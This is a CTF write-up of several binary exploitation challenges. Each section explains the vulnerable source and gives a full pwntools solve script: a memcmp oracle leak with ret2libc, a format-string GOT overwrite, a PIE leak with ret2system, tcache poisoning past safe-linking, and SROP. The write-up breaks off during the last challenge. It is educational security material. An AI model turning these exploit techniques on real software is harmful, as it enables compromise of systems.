The challenge is an admin panel with the option to either "authenticate" with a password or "reset password".

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

#define PWD_SIZE 0x10

void authenticate(char *password){
    char buffer[PWD_SIZE];
    
    printf("Please enter your current password: ");
    read(0, buffer, sizeof(buffer));

    if(memcmp(buffer, password, PWD_SIZE)){
        printf("Intruder detected!\n");
        exit(0);
    }

    printf("Welcome, admin\n>> ");
    read(0, buffer, 0x100);
}

void reset_password(char *password){
    char buffer[0x100];

    printf("Please enter your current password: ");
    int read_chars = read(0, buffer, sizeof(buffer));

    if(memcmp(buffer, password, read_chars)){
        printf("Incorrect password!\n");
        return;
    }

    printf("Unfortunately, this feature isn't implemented yet.\n");
}

void menu(){
    printf("1) Authenticate\n");
    printf("2) Reset password\n");
    printf("3) Exit\n");
    printf("What would you like to do?\n");
}

void init(char *password){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    int fd = open("/dev/urandom", O_RDONLY);
    int read_chars = read(fd, password, PWD_SIZE);

    if(read_chars != PWD_SIZE){
        printf("Something went wrong! Open a ticket.\n");
        exit(0);
    }
}

int main(){
    char password[PWD_SIZE];
    int input;

    init(password);

    while(1){
        menu();
        scanf("%d", &input);
        getchar();

        switch(input){
            case 1:
                authenticate(password);
                break;
            case 2:
                reset_password(password);
                break;
            case 3:
                return 0;
            default:
                printf("Invalid input!\n");
        }
    }
}
```

The program first reads 16 random chars from `/dev/null` to initialise as the password, which is a `char[PWD_SIZE` living in `main()`. The reset password function is unimplemented but verifies the password by comparing against the password in `main()` with `memcmp(buffer, password, read_chars)`. This will come in handy later.

When the user is authenticated in `authenticate(char *password)`, the program allows a __buffer overflow__ of 0x100 - 0x10. This is mostly likely our end goal.

Note that for all functions, the __password of reference__ lives only in `main()`.

### Information Leak

The challenge comes with a few protections:

- PIE enabled: The binary base address is randomised with ASLR
- Canary enabled: `[rbp-0x8]` is compared to the canary living in the Thread-Local Storage (TLS) in order to prevent trivial overflow.

and some artificial ones:

- A password check, which is random between each run

In order to bypass all three protections, we need an info-leak primitive.

#### Reset Password Function

Let's look at the `reset_password(char *password)` function a bit closer:

```c
void reset_password(char *password){
    char buffer[0x100];

    printf("Please enter your current password: ");
    int read_chars = read(0, buffer, sizeof(buffer));

    if(memcmp(buffer, password, read_chars)){
        printf("Incorrect password!\n");
        return;
    }

    printf("Unfortunately, this feature isn't implemented yet.\n");
}
```

Notice that `memcmp` takes a third argument, `read_chars`. According to the manpage for `memcmp`,

```

memcmp(3)                                           Library Functions Manual                                           memcmp(3)

NAME
       memcmp - compare memory areas

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include <string.h>

       int memcmp(const void s1[.n], const void s2[.n], size_t n);

DESCRIPTION
       The memcmp() function compares the first n bytes (each interpreted as unsigned char) of the memory areas s1 and s2.
```

When the third argument is given as `size_t n`, `memcmp` compares only the first `n` bytes of `s1[.n]`. Since `read_chars` is derived from the `read` call as its return value, the number of bytes read, we effectively control `read_chars`.

This also means that if we enter only 1 character that is correct, `memcmp` lets us pass, and for 2, 3, 4, and so on.

We can thus leak the password by bruting it bytewise with the `reset_password` function.

```c
    if(memcmp(buffer, password, read_chars)){
        printf("Incorrect password!\n");
        return;
    }

    printf("Unfortunately, this feature isn't implemented yet.\n");
```

As two different strings are printed depending on whether your password bytes are correct or not, we can use these strings as an __oracle__ to tell us whether our additional byte was correct.

```python
def reset(pw):
    p.sendlineafter(b'do?\n', b'2')
    p.sendafter(b'password: ', pw)

    resp = p.recvline().strip()

    # "Unfortunately" means the byte is part of the correct password
    return b'Unfortunately' in resp

def authenticate(pw, payload):
    p.sendlineafter(b'do?\n', b'1')
    p.sendafter(b'password: ', pw)
    p.sendafter(b'\n>> ', payload)


password = b''

while len(password) < 0x10:
    for i in range(0x100):
        guess = password + bytes([i])
        print(f"Trying: {guess}")
        if reset(guess):
            password = guess
            print(f"Found byte: {bytes([i])}")
            break
    else:
        print("No valid byte found. Something went wrong.")
        break
```

But other than the password, what can we leak?

Since our buffer is 0x100 bytes long, we are actually able to leak up to 0x100 bytes of the `main` stack frame starting from `char *password`!

Let's take a look at the stack frame in `main`:

```
gef> tel $rsp-0x40
      0x7fffffffd100|+0x0050|+010: 0x23f6fba394689cbe  <-  password
      0x7fffffffd108|+0x0058|+011: 0x0fe69b5301bebf2d
      0x7fffffffd110|+0x0060|+012: 0x0000000000000000
      0x7fffffffd118|+0x0068|+013: 0x5a6ac2709ac9bc00  <-  canary
$rbp  0x7fffffffd120|+0x0070|+014: 0x00007fffffffd1c0  ->  0x00007fffffffd220  ->  0x0000000000000000
      0x7fffffffd128|+0x0078|+015: 0x00007ffff7c2a578 <__libc_start_call_main+0x78>  ->  0xe80001ddb1e8c789 
```

Since the canary and the return address of `main`, which lives in libc, is within 0x100 bytes of the `password` buffer, we are actually able to leak those as well!

Increasing our leak length from 0x10 to 48:

```python
def reset(pw):
    p.sendlineafter(b'do?\n', b'2')
    q.sendafter(b'password: ', pw)

    resp = p.recvline().strip()

    # "Unfortunately" means the byte is part of the correct password
    return b'Unfortunately' in resp

def authenticate(pw, payload):
    p.sendlineafter(b'do?\n', b'1')
    p.sendafter(b'password: ', pw)
    p.sendafter(b'\n>> ', payload)


password = b''

while len(password) < 48:
    for i in range(0x100):
        guess = password + bytes([i])
        print(f"Trying: {guess}")
        if reset(guess):
            password = guess
            print(f"Found byte: {bytes([i])}")
            break
    else:
        print("No valid byte found. Something went wrong.")
        break

context.log_level = 'debug'

canary = u64(password[24:32])
log.info("canary, %#x", canary)
libc.address = u64(password[40:48]) - libc.sym.__libc_start_call_main - 0x78
log.info("libc.address, %#x", libc.address)
```

We can then perform a regular ret2libc to get a shell:

```python
canary = u64(password[24:32])
log.info("canary, %#x", canary)
libc.address = u64(password[40:48]) - libc.sym.__libc_start_call_main - 0x78
log.info("libc.address, %#x", libc.address)

payload = b'A' * 0x18
payload += pack(canary)
payload += b'B' * 8
payload += pack(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += pack(next(libc.search(b'/bin/sh\0')))
payload += pack(rop.ret[0])
payload += pack(libc.sym.system)

authenticate(password[:16], payload)

p.interactive()
```

### Full solve script

```python
from pwn import *

elf = context.binary = ELF("./authenticator_patched")
libc = ELF("./libc.so.6")
context.log_level = 'error'
context.terminal = 'kitty'

# p = process()
# gdb.attach(p)
p = remote('chal2.sieberr.live', 15002)

password = b''

def reset(pw):
    p.sendlineafter(b'do?\n', b'2')
    p.sendafter(b'password: ', pw)

    resp = p.recvline().strip()

    # "Unfortunately" means the byte is part of the correct password
    return b'Unfortunately' in resp

def authenticate(pw, payload):
    p.sendlineafter(b'do?\n', b'1')
    p.sendafter(b'password: ', pw)
    p.sendafter(b'\n>> ', payload)


password = b''

while len(password) < 48:
    for i in range(0x100):
        guess = password + bytes([i])
        print(f"Trying: {guess}")
        if reset(guess):
            password = guess
            print(f"Found byte: {bytes([i])}")
            break
    else:
        print("No valid byte found. Something went wrong.")
        break

context.log_level = 'debug'

canary = u64(password[24:32])
log.info("canary, %#x", canary)
libc.address = u64(password[40:48]) - libc.sym.__libc_start_call_main - 0x78
log.info("libc.address, %#x", libc.address)

payload = b'A' * 0x18
payload += pack(canary)
payload += b'B' * 8
payload += pack(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += pack(next(libc.search(b'/bin/sh\0')))
payload += pack(rop.ret[0])
payload += pack(libc.sym.system)

authenticate(password[:16], payload)

p.interactive()
```

## SecureLogin 3000

> Our company recently implemented the SecureLogin 3000 system, but someone had already broken in! Good thing we replaced the flag with a fake one beforehand!
>
> __author__: lty748
>
> __solves__: 4

### Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/securelogin/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

The challenge is yet another admin panel program allowing you to log in. 

There is a target win function, `gurt(char *yo)`, that calls `system(yo)`.

```c
// gcc -o main main.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char WELCOME_MSG[] = "Welcome to SecureLogin 3000™";
char GOODBYE_MSG[] = "Thank you for using SecureLogin 3000™";

int logged_in = 0;

void login()
{
    char username[100];
    FILE *log = fopen("/dev/null", "a"); // real log

    printf("Enter your username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    if (strcmp(username, "skibidiadmin123") == 0)
    {
        puts("Access granted.");
        logged_in = 1;
    }
    else
    {
        puts("Access denied, suspicious activity will be logged!");
        fprintf(log, username);
    }

    fclose(log);
}

void gurt(char *yo)
{
    system(yo);
}

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    puts(WELCOME_MSG);

    while (1)
    {
        printf("\n1. Login\n2. Exit\n3. Admin Panel\n> ");
        int choice;
        scanf("%d", &choice);
        getchar();

        switch (choice)
        {
        case 1:
            login();
            break;
        case 2:
            puts(GOODBYE_MSG);
            exit(0);
            break;
        case 3:
            if (logged_in)
            {
                puts("Welcome admin! The flag is sctf{fake_flag_really_fake}");
            }
            else
            {
                puts("Not authenticated");
            }
            break;
        default:
            puts("Invalid choice.");
        }
    }

    return 0;
}
```

Entering the given username gives you a fake flag. 

### Vulnerability

```c
void login()
{
    char username[100];
    FILE *log = fopen("/dev/null", "a"); // real log

    printf("Enter your username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    if (strcmp(username, "skibidiadmin123") == 0)
    {
        puts("Access granted.");
        logged_in = 1;
    }
    else
    {
        puts("Access denied, suspicious activity will be logged!");
        fprintf(log, username);
    }

    fclose(log);
}
```

When your username is wrong, `fprintf(log, username)` is interestingly called with no format string, but only our user-controlled username buffer.

Looking at the manpage for `fprintf`, we can see that it formats a string and writes it to a file opened by `fopen` 

```
printf(3)                                           Library Functions Manual                                           printf(3)

NAME
       printf,  fprintf, dprintf, sprintf, snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf - formatted output conver‐
       sion

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include <stdio.h>

       int printf(const char *restrict format, ...);
       int fprintf(FILE *restrict stream,
                   const char *restrict format, ...);
DESCRIPTION
       The functions in the printf() family produce output according to a format as described below.  The functions printf() and
       vprintf() write output to stdout, the standard output stream; fprintf() and vfprintf() write output to the  given  output
       stream; sprintf(), snprintf(), vsprintf(), and vsnprintf() write to the character string str.

       The function dprintf() is the same as fprintf() except that it outputs to a file descriptor, fd, instead of to a stdio(3)
       stream.
```

As formatted output is written to a file descriptor that may not necessarily be `stdout` (in this case `/dev/null`), we have no leak primitive, but we still have a arbitrary write primitive.

### Exploit

In order to perform our writes, we must first find the stack offset our username buffer lies on. Let us first modify `main.c` to write to a file we can read:

```c
// gcc -o main main.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char WELCOME_MSG[] = "Welcome to SecureLogin 3000™";
char GOODBYE_MSG[] = "Thank you for using SecureLogin 3000™";

int logged_in = 0;

void login()
{
    char username[100];
    FILE *log = fopen("./text", "a"); // real log

    printf("Enter your username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    if (strcmp(username, "skibidiadmin123") == 0)
    {
        puts("Access granted.");
        logged_in = 1;
    }
    else
    {
        puts("Access denied, suspicious activity will be logged!");
        fprintf(log, username);
    }

    fclose(log);
}

```

and then craft a `fuzz.py` to fuzz stack offsets:

```python
from pwn import *

elf = context.binary = ELF("./test")
context.log_level = 'error'

for i in range(1, 101):
    try:
        p = process()

        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'username: ', 'AAAA%{}$p'.format(i).encode())

        p.recvline()
        with open('./text', 'r') as f:
            resp = f.read().strip()

        open('./text', 'w').close() # clear file contents

        print(str(i) + ': ' + resp)
        p.close()

    except EOFError:
        pass
``` 

Examining the output list, we can then find the stack offset where our buffer lives:

```
1: AAAA0x7ffc23e9c3f0
2: AAAA0x7f8485c227d0
3: AAAA0xa
4: AAAA(nil)
5: AAAA0x7024352541414141
6: AAAA(nil)
7: AAAA0x7ffd42538140
8: AAAA0x7f7a477fe914
9: AAAA0x7fe73210d5c0
10: AAAA0x1e
11: AAAA0x1e
12: AAAA0xa
13: AAAA0x7ffe38851c70
14: AAAA0x7f48906d686a
15: AAAA(nil)
16: AAAA0x4030a0
17: AAAA(nil)
18: AAAA0x3aa6d2a0
19: AAAA0x7ffe4c5e8700
20: AAAA0x40068b
21: AAAA0x34268
22: AAAA0x100000000
23: AAAA0x7ffccd0ba700
24: AAAA0x7f262a5f05f5
```

### Write What to Where?

Looking at the binary protections, Partial Relro is enabled, hinting at a GOT overwrite attack. However, we can't write our win function to just any GOT entry because it requires the argument to be a pointer to `"/bin/sh"`.

Even so, if we were able to write `"/bin/sh"` to a memory region within the binary that would be passed into the first argument of a libc function, we can then write our win function to the GOT entry of that libc function to get our shell.

Looking at the program source again, there is one location in which a libc function is called on a pointer to a region in memory:

```c
        case 2:
            puts(GOODBYE_MSG);
            exit(0);
            break;
```

Looking in GDB, it turns out that `GOODBYE_MSG` actually lives in a writable section of the binary:

```
gef> base
----------------------------------------------------------- code base -----------------------------------------------------------
$codebase = 0x400000
$binbase = 0x400000
------------------------------------------------------------- .text -------------------------------------------------------------
$text = 0x401100
------------------------------------------------------------ .rodata ------------------------------------------------------------
$rodata = 0x402000
------------------------------------------------------------- .data -------------------------------------------------------------
$data = 0x404080
------------------------------------------------------------- .bss -------------------------------------------------------------
$bss = 0x404100
gef> x/40gx $data
0x404080:	0x0000000000000000	0x0000000000000000
0x404090:	0x0000000000000000	0x0000000000000000
0x4040a0 <WELCOME_MSG>:	0x20656d6f636c6557	0x7275636553206f74
0x4040b0 <WELCOME_MSG+16>:	0x33206e69676f4c65	0x0000a284e2303030
0x4040c0 <GOODBYE_MSG>:	0x6f79206b6e616854	0x737520726f662075
0x4040d0 <GOODBYE_MSG+16>:	0x7563655320676e69	0x206e69676f4c6572
0x4040e0 <GOODBYE_MSG+32>:	0x00a284e230303033	0x0000000000000000
0x4040f0:	0x0000000000000000	0x0000000000000000
0x404100 <stdout@GLIBC_2.2.5>:	0x00007ffff7fa25c0	0x0000000000000000
0x404110 <stdin@GLIBC_2.2.5>:	0x00007ffff7fa18e0	0x0000000000000000
0x404120 <stderr@GLIBC_2.2.5>:	0x00007ffff7fa24e0	0x0000000000000000
0x404130:	0x0000000000000000	0x0000000000000000
0x404140:	0x0000000000000000	0x0000000000000000
0x404150:	0x0000000000000000	0x0000000000000000
0x404160:	0x0000000000000000	0x0000000000000000
0x404170:	0x0000000000000000	0x0000000000000000
0x404180:	0x0000000000000000	0x0000000000000000
0x404190:	0x0000000000000000	0x0000000000000000
0x4041a0:	0x0000000000000000	0x0000000000000000
0x4041b0:	0x0000000000000000	0x0000000000000000
gef> vmmap 0x4040c0
[ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000000000404000 0x0000000000405000 0x0000000000001000 0x0000000000003000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/securelogin/main +0xc0
gef>
```

Hence, we can write our `/bin/sh` string to `GOODBYE_MSG`, and `gurt` to the `puts` GOT entry in the binary, before selecting option 2 to get our shell.

### Full solve script

```python
from pwn import *

elf = context.binary = ELF("./main")
context.log_level = 'debug'
context.terminal = 'kitty'

# p = process()
# gdb.attach(p)
p = remote('chal2.sieberr.live', 15003)

p.sendlineafter(b'> ', b'1')
payload = fmtstr_payload(5, {0x4040c0: b'/bin/sh\0'}, write_size='short')
p.sendlineafter(b'Enter your username: ', payload)

p.sendlineafter(b'> ', b'1')
payload = fmtstr_payload(5, {elf.got.puts: elf.sym.gurt}, write_size='short')
p.sendlineafter(b'Enter your username: ', payload)

p.sendlineafter(b'> ', b'2')
p.interactive()
```

## Bearings Check 

> Every pwner has had to gain their bearings at least once. Can you gain yours?
>
> __author__: whywhy
>
> __solves__: 19

### Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/bearings/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
```

The challenge initialises a struct in the stack containing a `char name[32]` buffer, a `void* main_ref` pointer to `main`, a `char pad[8]` buffer, and a `char vuln[32]` buffer. 

The user is allowed to read 32 bytes into the name buffer, but is then allowed a buffer overflow of 2048 - 32 bytes into the vuln buffer.

There is a `gift` function not called anywhere, containing a `pop rdi; ret` gadget as well as a `system` call.

A `/bin/sh` string is initialised as `static char`, and hence lives in the BSS/.data region.

PIE is enabled, hence we will need an info leak in order to use gadgets or functions in the binary.

```c
// gcc -o chal chal.c -Wl,-z,relro,-z,now -fpie -pie

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

struct proving_ground {
    char name[32];
    void* main_ref;
    char pad[8];
    char vuln[32];
};

void gifts() {
    static char gift[8] = "/bin/sh\x00";
    __asm__(
        "pop %rdi;"
        "ret;"
    );
    system("echo You're going to need to try harder than this...");
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    struct proving_ground field;
    strncpy(field.pad, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
    field.main_ref = &main;
    puts("To become a pwner, you must first know how to gain your bearings. ");
    puts("Time to prove yourself! ");
    printf("Let's start slow. What is your name? \n> ");
    read(0, field.name, 32);
    getchar();
    printf("Very well, %s. Now, let's see what you've got! \n> ", field.name);
    read(0, field.vuln, 2048);
    getchar();
    puts("I hope that worked out for you...");
    return 0;
}

```

### Info Leak 

In order to defeat PIE, we first need an info leak of an address that lives in the binary.

In `main`:

```c
    printf("Let's start slow. What is your name? \n> ");
    read(0, field.name, 32);
    getchar();
    printf("Very well, %s. Now, let's see what you've got! \n> ", field.name);
```

`field.name` is 32 bytes long and 16 bytes aligned within the `proving_ground` struct. Hence, it is also directly adjacent to `field.main_ref`, which contains a pointer to `main`.

The `%s` format specifier in `printf` only stops printing from a `char` buffer when it reaches a null byte, so we can attain an info leak by filling `field.name` with 32 non-null bytes, and then receiving 6 bytes of the address of `main` to attain our info leak:

```python
p.sendafter(b'name? \n> ', b'A' * 32)
p.send(b'\n')
p.recvuntil(b'A' * 32)
elf.address = u64(p.recv(6) + b'\0' * 2) - elf.sym.main
log.info("elf.address, %#x", elf.address)
```

### ret2system@plt

We can now utilise the large buffer overflow in `field.vuln` to overwrite the return address and stack with our exploit ROP chain.

As `system` is available through the .plt stub `system@plt` within the binary, it is possible to call `system` with our ROP chain on the `/bin/sh` string that lives within the BSS/.data.

### Full solve script

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.log_level = 'debug'
context.terminal = 'kitty'

# p = process()
# gdb.attach(p)
p = remote('chal2.sieberr.live', 15001)

p.sendafter(b'name? \n> ', b'A' * 32)
p.send(b'\n')
p.recvuntil(b'A' * 32)
elf.address = u64(p.recv(6) + b'\0' * 2) - elf.sym.main
log.info("elf.address, %#x", elf.address)

rop = ROP(elf)
rop.raw(b'A' * (0x58 - 6*8))
rop.raw(rop.ret[0])
rop.system(next(elf.search(b'/bin/sh\0')))

print(rop.dump())

p.sendafter(b'\n> ', rop.chain())

p.interactive()
```

## Leaky Heap

> waiter waiter! my leak has a heap!
>
> __author__: whywhy
>
> __solves__: 9

### Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/leakyheap/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
```

The challenge is a heap exploitation challenge that exposes malloc, free, and write functionalities. When selected, there is also a "sanity check" that checks if a `pigs_flying` variable in the BSS is 1, calling `system("cat flag.txt")` if it is. Writing '\x01' to the variable is thus the target of the challenge.

```c
// gcc -o chal chal.c -Wl,-z,relro,-z,now -fno-pie -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define ALLOC_SIZE 32

int main() {
    setbuf(stdin,0);
    setbuf(stdout,0);
    static unsigned long long pigs_flying = 0;
    char* chunks[16] = {NULL};
    int choice = 0;
    int idx = 0;
    while (1) {
        printf("> ");
        scanf("%d", &choice);
        switch (choice) {
            case 0: default:
                goto sanity_check;
            case 1: 
                printf("> ");
                scanf("%d", &idx);
                if (idx < 0 || idx >= 16) break;
                chunks[idx] = malloc(ALLOC_SIZE);
                printf("the tap drips: %p\n", chunks[idx]);
                break;
            case 2: 
                printf("> ");
                scanf("%d", &idx);
                if (idx < 0 || idx >= 16) break;
                free(chunks[idx]);
                break;
            case 3:
                printf("> ");
                scanf("%d", &idx);
                if (idx < 0 || idx >= 16 || chunks[idx]==NULL) break;
                printf("> ");
                scanf("%31s", chunks[idx]);
                break;
        }
    }

sanity_check:
    if (pigs_flying == 1) {
        system("cat flag.txt");
    } else {
        printf("huh? everything seems to be in place...\n");
    }
    _exit(0);
}
```

### Vulnerability

The challenge has a Use-After-Free (UAF) vulnerability that allows the user to write to the chunk even after freeing. Furhermore, the `malloc` functionality prints the address of each chunk, giving us a free heap leak.

This thus points at a tcache poisoning attack.

#### Tcache Poisoning

Tcache poisoning is a technique that refers to hijacking the tcache free list to enable arbitrary allocation primitives. This can thus enable arbitrary read/write primitives, which could then be used to achieve code execution.

In this case, we need an arbitrary write primitive to write `\x01` to `pigs_flying`.

The tcache freelist operates on a Last-In-First-Out (LIFO) linked list data structure. When `malloc` is called, it first looks in the tcache for chunks that could service the request.

```
head ------> 0x404810 ------> 0x404830 ------> 0x404850 ------> NULL
count: 3
```

When a freed chunk is sent to the tcache, the chunk takes the form of the following struct:

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  struct tcache_perthread_struct *key;
} tcache_entry;
```

A tcache poisoning attack involves using a UAF primitive to be able to write and modify the `tcache_entry *next` pointer of the freed chunk in order to hijack the freelist:

```
head ------> 0x404810 ------> EVIL 
```

However, we must note another protection at play.

#### Tcache Safelinking (GLIBC 2.32<)

Since GLIBC 2.32, the libc uses a form of protection for singly-linked lists in the free bins known as __safe-linking__. This involves protecting the `tcache_entry *next` pointer with pointer mangling through the following formula:

```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

In essence, if a freed chunk lives at:

```
0x404810: 0x0000000000404830
```

Then safelinking encrypts the `*next` pointer through `(0x404810 >> 12) ^ 0x404830 = 0x404 ^ 0x404830`.

This requires an extra heap leak, and thus another info leak, to enable tcache poisoning by forging a correctly encrypted `*next` pointer.

### Exploitation

Since the program gives us a free heap leak, we can bypass safe-linking to do tcache poisoning and arballocate to `pigs_flying`. We will first allocate two chunks:

```python
chunks = [0] * 16

def alloc(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(idx).encode())
    p.recvuntil(b'drips: ')
    chunks[idx] = int(p.recvline().strip(), 16)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())

def write(idx, content):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', content)

def sanity():
    p.sendlineafter(b'> ', b'0')

alloc(0)
alloc(1)
```

Free the both of them:

```python
free(1)
free(0)
```

Abuse our UAF to write a forged `*next` pointer to chunk `0`:

```python
write(0, pack((chunks[0] >> 12) ^ 0x404030)) # pigs_flying: 0x404030
```

And thus allocate twice again to obtain an allocated chunk at `pigs_flying`:

```python
alloc(0)
alloc(0) # pigs_flying
```

We can then write our `\x01` to the chunk and trigger the sanity check to get our flag.

### Full solve script

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.log_level = 'debug'
context.terminal = 'kitty'

# p = process()
# gdb.attach(p)
p = remote('chal2.sieberr.live', 15004)

chunks = [0] * 16

def alloc(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(idx).encode())
    p.recvuntil(b'drips: ')
    chunks[idx] = int(p.recvline().strip(), 16)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())

def write(idx, content):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', content)

def sanity():
    p.sendlineafter(b'> ', b'0')

alloc(0)
alloc(1)
free(1)
free(0)
write(0, pack((chunks[0] >> 12) ^ 0x404030))
alloc(0)
alloc(0)
write(0, b'\x01')
sanity()

p.interactive()
```

## Sieberrop

> __author__: lty748
>
> __solves__: 1

I did not manage to solve this within the duration of the qualifiers CTF. ~im so mad though because i tried it on the train and solved it within 4 minutes~

### Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/sieberrop/vuln'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

The challenge is a barebones `nasm` binary written without linking libc.

```nasm
global _start

section .text
_start:
    ; Reserve 0x100 bytes on the stack for local buffer
    enter 0x100, 0x0

    ; Call the timer function to set an alarm
    call set_alarm

    ; Syscall: write(stdout, msg, msg_len)
    mov rax, 0x1          ; syscall number for write
    mov rdi, rax          ; file descriptor 1 (stdout)
    lea rsi, [rel msg]    ; pointer to message
    mov edx, msg_len      ; message length
    syscall

    ; Syscall: read(stdin, rsp, 0x1000)
    xor eax, eax          ; syscall number 0 (read)
    xor edi, edi          ; file descriptor 0 (stdin)
    mov rsi, rsp          ; buffer on stack
    mov edx, 0x1000       ; number of bytes to read
    syscall

    leave
    ret

set_alarm:
    ; Syscall: alarm(15)
    mov edi, 15
    mov eax, 37           ; syscall number for alarm
    syscall
    ret

section .data
    msg: db "As a pup, the wolf YEARNED for the /bin/sh"
    msg_len: equ $ - msg
```

A string is written to `stdout` when the program is run, before reading 0x1000 bytes.

This is a Sigreturn Oriented Programming (SROP) problem, as we have no gadgets to control `rdi`, `rsi`, or `rdx` but can control `rax` through syscalls. There exists a large buffer overflow, which we will use to write an SROP chain.

### What is SROP? 

A __sigreturn__ is a syscall that is used to return from a __signal handler__ and clean up a stack frame after a signal has been unblocked. 

When a sigreturn is called, all register values __are stored on the stack__. After the signal is unblocked, all the values are popped back in, with `rsp` pointing to the bottom of the sigreturn frame (the collection of register values).

Hence, we can use a sigreturn syscall to control `rdi`, `rsi`, `rdx,` and `rip` and thus get our shell

### Exploit

We first need a way to control `rax` and set it to 15. In `set_alarm`, `alarm(15)` is called:

```nasm
set_alarm:
    ; Syscall: alarm(15)
    mov edi, 15
    mov eax, 37           ; syscall number for alarm
    syscall
    ret

```

In the manpage for `alarm`, we can see that:

```
alarm(2)                                               System Calls Manual                                              alarm(2)

NAME
       alarm - set an alarm clock for delivery of a signal

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include <unistd.h>

       unsigned int alarm(unsigned int seconds);

DESCRIPTION
       alarm() arranges for a SIGALRM signal to be delivered to the calling process in seconds seconds.

       If seconds is zero, any pending alarm is canceled.

       In any event any previously set alarm() is canceled.

RETURN VALUE
       alarm()  returns the number of seconds remaining until any previously scheduled alarm was due to be delivered, or zero if
       there was no previously scheduled alarm.
```

Hence, in order to set `rax` to the syscall number of `rt_sigreturn`, 15, we can first set two alarms. The first alarm will first set an alarm, and then we can use the second alarm to return the number of seconds remaining until the first alarm was due to be delivered, 15, hence setting `rax` to 15.

```python
rop = ROP(elf)
rop.raw(b'A' * 264)
rop.set_alarm()
rop.set_alarm()
```

We can then call `rt_sigreturn` with a `syscall; ret` gadget in the binary:

```python
rop = ROP(elf)
rop.raw(b'A' * 264)
rop.set_alarm()
rop.set_alarm()
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
``` 

Now, we can forge a fake `sigreturn` frame as the register values on the stack after our syscall. Fortunately, `pwntools` has a convenient `SigreturnFrame` class that helps to automate this process.

Noting that the only string in the binary contains a `/bin/sh` at 0x402023, we can thus set `rdi` to that address. We can thus set the other registers accordingly to set up an `execve("/bin/sh", 0, 0)` syscall that will get our shell.

```python
rop = ROP(elf)
rop.raw(b'A' * 264)
rop.set_alarm()
rop.set_alarm()
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402023
frame.rsi = 0
frame.rdx = 0
frame.rip = rop.find_gadget(['syscall', 'ret'])[0]

rop.raw(bytes(frame))
```

### Full solve script

```python
from pwn import *

elf = context.binary = ELF("./vuln")
context.log_level = 'debug'
context.terminal = 'kitty'

p = process()
gdb.attach(p)

rop = ROP(elf)
rop.raw(b'A' * 264)
rop.set_alarm()
rop.set_alarm()
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402023
frame.rsi = 0
frame.rdx = 0
frame.rip = rop.find_gadget(['syscall', 'ret'])[0]

rop.raw(bytes(frame))

p.send(rop.chain())

p.interactive()
```

## Writer

> you have so many writes i wouldnt stress about making them count
>
> __author__: whywhy
> 
> __solves__: 0

I did not manage to solve this within the duration of the qualifiers CTF. Nevertheless, let's take a look at the challenge.

### Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/writer/chal_patched'
    Arch:       amd64-64-little
